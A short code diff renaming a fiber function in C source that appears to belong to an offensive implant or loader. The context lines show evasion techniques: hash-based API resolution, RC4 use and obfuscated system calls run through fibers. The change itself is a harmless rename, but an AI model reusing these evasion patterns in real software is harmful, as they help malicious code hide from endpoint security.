@@ -194,7 +194,7 @@ static DECLSPEC_NOINLINE D_SEC( E ) VOID WINAPI CfgAddAddr( _In_ PVOID ImageBase
  *
 !*/
 
-static D_SEC( E ) VOID WINAPI ObjectFiber( _In_ PF_PARAM Fbr )
+static D_SEC( E ) VOID WINAPI ObfSystemCallFiber( _In_ PF_PARAM Fbr )
 {
 	API				Api;
 	USTRING				Rc4;
@@ -788,7 +788,7 @@ D_SEC( E ) NTSTATUS NTAPI ObfSystemCall( _In_ PVOID Addr, _In_ PVOID* Argv, _In_
 		Fbr.CreateFiber          = PeGetFuncEat( K32, H_API_CREATEFIBER );
 
 		if ( ( Fbr.Master = Fbr.ConvertThreadToFiber( &Fbr ) ) ) {
-			if ( ( Fbr.Slave = Fbr.CreateFiber( 0x1000 * 6, C_PTR( G_SYM( ObjectFiber ) ), &Fbr ) ) ) {
+			if ( ( Fbr.Slave = Fbr.CreateFiber( 0x1000 * 6, C_PTR( G_SYM( ObfSystemCallFiber ) ), &Fbr ) ) ) {
 				if ( NT_SUCCESS( Fbr.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( G_SYM( ThreadCall ) ), C_PTR( & Fbr ), FALSE, 0, 0x1000 * 2, 0x1000 * 1, NULL ) ) ) {
 					if ( NT_SUCCESS( Fbr.NtWaitForSingleObject( Thd, FALSE, NULL ) ) ) {
 					};
